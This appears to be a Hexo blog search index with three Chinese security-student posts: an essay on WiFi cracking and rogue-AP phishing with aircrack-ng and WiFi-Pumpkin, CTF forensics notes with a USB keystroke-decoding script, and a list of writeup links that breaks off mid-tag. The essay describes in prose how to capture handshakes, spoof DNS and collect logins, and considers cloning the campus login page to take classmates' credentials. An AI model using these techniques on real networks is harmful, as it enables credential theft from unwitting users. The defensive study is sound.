<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>记一次社会工程学的实战应用以及思考</title>
      <link href="/2019/03/04/ji-yi-ci-she-hui-gong-cheng-xue-de-shi-zhan-yu-si-kao/"/>
      <url>/2019/03/04/ji-yi-ci-she-hui-gong-cheng-xue-de-shi-zhan-yu-si-kao/</url>
      
        <content type="html"><![CDATA[<p>（本文为信息安全选修课的大作业，在老师的要求下就写得比较正式，有点不爽，还是喜欢博客形式的随心所欲。以下为全文）</p><hr><p>摘要：在互联网技术高速发展的时代，我们的信息安全越来越难以保障，个人隐私泄露导致的财产安全问题也越来越频繁发生。黑客们层出不穷的攻击方式使我们疲于应对，如今更是将网络攻击技术与社会工程学相结合起来，分别从系统和人性两个层面对我们进行入侵，这类攻击方式对于普通人而言极难进行防御，对我们安全人员更是提出了新的挑战。本文记录了一次运用社会工程学的攻击实战，提出了笔者的见解与拓展思考。</p><h2 id="一、-引言："><a href="#一、-引言：" class="headerlink" title="一、    引言："></a>一、    引言：</h2><p>本着“知己知彼，百战不殆”的学习的态度，笔者将模拟一次利用社会工程学来获取被攻击者账号密码的实验，从攻击者的角度来进行学习探究，以及对攻击方式的优化，加深对社会工程学的认识，帮助我们防范此类攻击。</p><h2 id="二、相关技术及原理："><a href="#二、相关技术及原理：" class="headerlink" title="二、相关技术及原理："></a>二、相关技术及原理：</h2><h3 id="一-什么是社会工程学？"><a href="#一-什么是社会工程学？" class="headerlink" title="(一)什么是社会工程学？"></a>(一)什么是社会工程学？</h3><p>社会工程学是一种通过对被攻击者的心理弱点、本能反应以及好奇心、信任、贪婪等心理陷阱进行的诸如欺骗、伤害等危害手段，获取非法利益的行为。</p><h3 id="二-Aircrack-ng简介："><a href="#二-Aircrack-ng简介：" class="headerlink" title="(二) Aircrack-ng简介："></a>(二) Aircrack-ng简介：</h3><p>Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件。<br>主要功能有：<br>1.网络侦测<br>2.数据包嗅探<br>3.WEP和WPA/WPA2-PSK破解</p><h3 id="三-WIFI-Pumpkin简介："><a href="#三-WIFI-Pumpkin简介：" class="headerlink" title="(三) WIFI-Pumpkin简介："></a>(三) WIFI-Pumpkin简介：</h3><p>WiFi-Pumpkin是一款无线安全检测工具，利用该工具可以伪造接入点完成中间人攻击，同时也支持一些其它的无线渗透功能。旨在提供更安全的无线网络服务，该工具可用来监听目标的流量数据，通过无线钓鱼的方式来捕获不知情的用户，以此来达到监控目标用户数据流量的目的。<br>主要功能：<br>1.Rouge Wi-Fi接入点功能<br>2.Deauth攻击目标客户端AP功能<br>3.探测请求监测功能<br>4.Crendentials凭证监视功能<br>5.DHCP攻击<br>6.虚假的MAC地址广播DHCP请求攻击<br>7.HSTS劫持攻击功能<br>8.支持 airodump扫描检测功能<br>9.支持mkd3洪水攻击<br>10.支持beef hook功能<br>11.可生成html日志<br>12.支持Mac地址变换功能<br>13.支持ARP攻击<br>14.支持DNS欺骗功能</p><h2 id="三、实战过程："><a href="#三、实战过程：" class="headerlink" title="三、实战过程："></a>三、实战过程：</h2><p>本次实战笔者先从窃取wifi密码入手，原因除了wifi能经常接触到，容易被盗取还有其他原因之后会说明。普通窃取wifi密码的方式（非社工）大致就是获取wifi握手包，然后用字典来进行暴力破解，因为弱口令密码一直以来都是很容易忽略的问题，甚至很多路由器wifi密码还是出厂设置的“admin”，“最简单的往往就是最有效的”是对弱口令最好的诠释。实战所使用到的工具有：笔记本，无线网卡，虚拟机的kali linux系统。</p><p>笔者将首先使用aircrack-ng来进行攻击。在kali下开启网卡监听模式来监听周围的wifi状态，然后选择要破解的wifi来进行监听。这里笔者为了便于测试就自己用手机开了一个wifi热点，然后用电脑进行连接，模拟正常环境中的状态。针对要破解的wifi发送一个断开命令，强制断开连接的设备，这时候电脑就会重新连接，就可以捕获电脑连接wifi时的握手包，也就是俗称的“抓包”。接着笔者用已经准备好的字典来进行暴力破解，当然为了能更快的跑出密码来，笔者这里的wifi使用了弱口令。至此，一个简单的窃取wifi实战已经完成。</p><p>然而这只是个最简单的、在理想环境下的窃取wifi。实际中所遇到的问题可就太多了，比如网络信号不好，渗透工具不好使，被攻击者所使用的wifi密码不是弱口令等等问题。其中从技术角度来看，最难的部分笔者认为是非弱口令密码的破解问题，只要改个有字母数字符号的长密码，即使用几十G的字典也很难跑出来，还花费大量时间。倘若是结合社会工程学来进行攻击，那就简单多了。可以搭建个钓鱼wifi伪装成正常的wifi，让被攻击者误连接上钓鱼wifi，此时就能直接获取wifi的明文密码。这就相当于被攻击者自己把密码告诉了攻击者，而他自己却还浑然不知，攻击者获取了对方的信任。利用人性的弱点，这就是社会工程学的可怕之处，也是难以防御的原因。</p><p>黑客们使用钓鱼手段通常是在以下场景：在网吧，奶茶店等公共场所连接上wifi后会跳转到一个认证的登录页面，在这个登录页面的要输入账号密码才能进行上网。接下来笔者将使用WIFI-Pumpkin来创建钓鱼wifi来窃取账号密码。在kali下打开wifi-pumpkin并设置好相应的参数后运行，用手机就能看到已经出现了一个新的wifi名“PumpAP”，我们可以将这个名字修改成“CMCC”等看上去可信度更高的名字。接着笔者使用dns欺骗的攻击方式，即被攻击者要访问某个网站，实际上他访问的是攻击者指定的ip地址。攻击者若是再将ip地址使用个高仿的域名和页面，就能以假乱真，使被攻击者乖乖的交出自己登陆认证的账号密码。在WiFi-Pumpkin里有个已经做好的钓鱼登录页面模板，笔者把它放入相应的目录，以及连接上mysql数据库就能使用了。然后被攻击者在这个页面下输入的任何数据都能在WiFi-Pumpkin看得一清二楚。输入账号密码后会重定向到真实的页面以迷惑被攻击者。</p><p>笔者想到了本学校的校园网也是这样的登录认证方式，那么应该也可以用这种社工的方式来获取同学们校园网的账号密码。不过学校的安全性做得比较好，笔者在对校园网页面进行克隆时发现输入账号密码的地方竟然是用js渲染的，用工具快速克隆出的网站并不能输入，也就是个“死”界面。得自己手工来写出一个高仿的前端页面才行，工具已经派不上用场，这就加大了攻击难度。在攻击收益远小于攻击难度后，相信大多数攻击者也就不会再实施攻击了。</p><p>以上就是笔者本次对社会工程学的研究与思考，了解了社工的原理后，也就没有必要再害怕它，它就像是一把武器，我们学会使用它，今后就可将锋利的武器变成我们强有力的盾牌。</p><h2 id="四、结论："><a href="#四、结论：" class="headerlink" title="四、结论："></a>四、结论：</h2><p>1.设置一个强密码是很重要的，这是防备网络攻击的最简单的方式之一。<br>2.最好不要连公共场所的未知wifi，因为这很有可能是黑客在进行钓鱼。<br>3.提高警惕之心，在登录界面的任何一次输入账号密码都有可能被窃取，可以试着输入错误的账号密码来进行试探，假如是钓鱼页面则不会提示密码错误之类的而是重定向到一个页面，一般会跳转到真实页面（但也不排除黑客将任何输入都回显出错误的情况）</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社工,WiFi </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>每次ctf比赛后的收获</title>
      <link href="/2018/11/12/ctf-gain/"/>
      <url>/2018/11/12/ctf-gain/</url>
      
        <content type="html"><![CDATA[<p>每个比赛都能见到很多新奇的东西和新的思路，新的解题方法，新的工具，收获挺多的（还有很多对自己菜狗的吐槽）。所以想记录下来。详细的wp我都收藏在<a href="http://baimaozi.top/2018/11/12/collect-wp/">另一篇博文</a>里了。<br>长期更新。</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><hr><h3 id="easy-dump（来自2018HCTF）"><a href="#easy-dump（来自2018HCTF）" class="headerlink" title="easy dump（来自2018HCTF）"></a>easy dump（来自2018HCTF）</h3><p><a href="https://pan.baidu.com/s/1ntJWNs9OWD-4_QHhbkxpzw" target="_blank" rel="noopener">easy dump</a>是一道内存的取证分析题，使用到的工具有volatility和<code>GIMP</code>。比赛时我已经做到提取出mspaint.exe的dmp文件这一步了，下一步我没想（google）到该怎么做，用什么工具做，就很气！现在看了wp后就要记笔记了。<br>用的是<code>GIMP</code>这个工具，使用步骤<code>File-&gt;Open-&gt;Select File Type-&gt;Raw image data</code>，来打开提取出的dmp文件，然后修改相应的参数（这一题修改参数为Image Type：RGB Alpha，Offset=152650653，Width=1457，Height=500）。<br>工具的操作挺烦的，这个<code>GIMP</code>摸索了很久，又是一个巨坑！<br>其次我觉得找参数这种挺看运气的，毕竟太多了，一个一个试太浪费时间，而且还没提示。</p><h3 id="difficult-programming-language（来自2018HCTF）"><a href="#difficult-programming-language（来自2018HCTF）" class="headerlink" title="difficult programming language（来自2018HCTF）"></a>difficult programming language（来自2018HCTF）</h3><p><a href="https://pan.baidu.com/s/1s2vi0eVmkD74uJoCIxnyHA" target="_blank" rel="noopener">difficult programming language</a>是一道usb的流量分析，比赛之前我没见过这类型的流量分析（孤陋寡闻了），然后一直google相关的题型来看。<br>大致就是提取出键盘或鼠标的流量，然后用脚本转成相应的“输入”出来，键盘的输入是字符（一般就是flag），鼠标的输入一般是图片（用鼠标画出flag）。贴一下现成的键盘脚本和<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf" target="_blank" rel="noopener">usb官方文档</a>，以后能直接用了：</p><pre class=" language-javascript"><code class="language-javascript">normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"t"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"w"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>shiftKeys <span class="token operator">=</span>  <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span> <span class="token string">"12"</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">"13"</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"14"</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">"15"</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"16"</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"17"</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token string">"18"</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"19"</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">"1a"</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"1b"</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"1c"</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"1d"</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span><span class="token string">"1e"</span><span class="token punctuation">:</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"1f"</span><span class="token punctuation">:</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"20"</span><span class="token punctuation">:</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"21"</span><span class="token punctuation">:</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"22"</span><span class="token punctuation">:</span><span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"23"</span><span class="token punctuation">:</span><span class="token string">"^"</span><span class="token punctuation">,</span><span class="token string">"24"</span><span class="token punctuation">:</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span><span class="token string">"25"</span><span class="token punctuation">:</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"26"</span><span class="token punctuation">:</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"27"</span><span class="token punctuation">:</span><span class="token string">")"</span><span class="token punctuation">,</span><span class="token string">"28"</span><span class="token punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"{"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"}"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">}</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>shifts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    nums<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    shifts<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s <span class="token operator">=</span> shifts<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token string">'00'</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> normalKeys<span class="token punctuation">:</span>        <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">'02'</span><span class="token punctuation">:</span>            output <span class="token operator">+</span><span class="token operator">=</span> shiftKeys<span class="token punctuation">[</span>n<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            output <span class="token operator">+</span><span class="token operator">=</span> normalKeys<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">'[unknown'</span><span class="token operator">+</span>n<span class="token operator">+</span><span class="token string">']'</span>print output</code></pre><p>运行得到</p><pre class=" language-javascript"><code class="language-javascript">D'<span class="token template-string"><span class="token string">`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\a`</span></span>_X<span class="token operator">|</span>V<span class="token punctuation">[</span>Tx<span class="token punctuation">;</span><span class="token punctuation">:</span>VONSRQJn1MFKJCBfFE<span class="token operator">></span><span class="token operator">&amp;</span><span class="token operator">&lt;</span>`@<span class="token number">9</span><span class="token operator">!=</span><span class="token operator">&lt;</span>5Y9y7654<span class="token operator">-</span><span class="token punctuation">,</span>P0<span class="token operator">/</span>o<span class="token operator">-</span><span class="token punctuation">,</span><span class="token operator">%</span>I<span class="token punctuation">)</span>ih<span class="token operator">&amp;</span><span class="token operator">%</span>$#z@xw<span class="token operator">|</span><span class="token punctuation">{</span>ts9wvXWm3<span class="token operator">~</span>c</code></pre><p>比赛中我也是做到这一步。。。然后最捞的就是我不懂这一串奇怪的东西是什么，结合题目推测应该是某种编程语言，可我压根就没见过这种奇葩的语言！！！<br>看了wp才知道这是<code>malbolge</code>，<a href="http://www.compileonline.com/execute_malbolge_online.php" target="_blank" rel="noopener">在线运行</a>。<br>还是积累得少了，吃亏在这种自己没见过世面的地方，所以记笔记！没见过这种类型是真的想不到！类似的奇葩编程语言还挺多的，正好顺便搜了些来看看，学到了！学到了！（在奇葩的路上渐行渐远）</p><p>——2018年11月12日更新</p><hr><p>今天看到一篇文章，挺有感触的，记录一下：<a href="http://rabbithouse.me/2018/10/04/our-ctf.html" target="_blank" rel="noopener">《对CTF的思考》</a>。CTF现在的意义到底在哪了呢？真实工作环境也不会遇到这些。</p><p>——2018年11月20日更新</p><hr>]]></content>
      
      
      <categories>
          
          <category> 赛后收获 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>收集比赛后师傅们的writeup</title>
      <link href="/2018/11/12/collect-wp/"/>
      <url>/2018/11/12/collect-wp/</url>
      
        <content type="html"><![CDATA[<p>收集我参加过的比赛的writeup，方便复现的时候找。能学一点是一点，大师傅们的博客都是财富哇，空闲的时候时不时看一下。静静的做个舔狗（羡慕哇，啥时候也能成为被大家收藏的博客）<br>长期更新。</p><hr><h2 id="2018LCTF"><a href="#2018LCTF" class="headerlink" title="2018LCTF"></a><a href="https://lctf.pwnhub.cn/index" target="_blank" rel="noopener">2018LCTF</a></h2><h3 id="官方-writeup-及题目源码"><a href="#官方-writeup-及题目源码" class="headerlink" title="官方 writeup 及题目源码"></a><a href="https://github.com/LCTF/LCTF2018" target="_blank" rel="noopener">官方 writeup 及题目源码</a></h3><h3 id="LCTF-2018-T4lk-1s-ch34p-sh0w-m3-the-sh31l-详细分析"><a href="#LCTF-2018-T4lk-1s-ch34p-sh0w-m3-the-sh31l-详细分析" class="headerlink" title="LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析"></a><a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析</a></h3><p>其中一位出题人写的</p><h3 id="Kerberos-amp-PAC-amp-MS14-068-（下）-amp-amp-LCTF2018-God-of-domain-pentest-writeup"><a href="#Kerberos-amp-PAC-amp-MS14-068-（下）-amp-amp-LCTF2018-God-of-domain-pentest-writeup" class="headerlink" title="Kerberos &amp; PAC &amp; MS14-068 （下）&amp;&amp; LCTF2018 God of domain pentest writeup"></a><a href="http://blog.w1nd.top/2018/11/19/LCTF-God%20of%20domain-pentest%20writeup/" target="_blank" rel="noopener">Kerberos &amp; PAC &amp; MS14-068 （下）&amp;&amp; LCTF2018 God of domain pentest writeup</a></h3><h3 id="LCTF-2018-Writeup-–-Nu1L"><a href="#LCTF-2018-Writeup-–-Nu1L" class="headerlink" title="LCTF 2018 Writeup – Nu1L"></a><a href="https://xz.aliyun.com/t/3341" target="_blank" rel="noopener">LCTF 2018 Writeup – Nu1L</a></h3><h3 id="LCTF-2018-Writeup-–-Aurora"><a href="#LCTF-2018-Writeup-–-Aurora" class="headerlink" title="LCTF 2018 Writeup – Aurora"></a><a href="https://xz.aliyun.com/t/3340" target="_blank" rel="noopener">LCTF 2018 Writeup – Aurora</a></h3><h3 id="LCTF-2018-Writeup-–-whitzard"><a 